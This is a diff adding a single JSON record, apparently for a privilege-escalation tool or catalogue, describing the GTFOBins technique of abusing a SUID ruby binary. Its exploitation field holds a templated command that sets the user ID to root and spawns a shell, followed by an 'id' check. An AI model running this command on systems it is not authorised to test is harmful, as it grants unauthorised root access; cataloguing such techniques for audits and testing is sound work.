@@ -1,0 +1,11 @@
+{
+  "id": "suid_ruby",
+  "category": "SUID_GTFOBINS",
+  "binary": "ruby",
+  "cve": null,
+  "exploitation": ["{{binary}} -e 'Process::Sys.setuid(0); exec \"{{shell}}\"'"],
+  "post_exploit": ["id"],
+  "source": "gtfobins.github.io",
+  "tags": ["suid", "gtfobins"],
+  "severity": "high"
+}
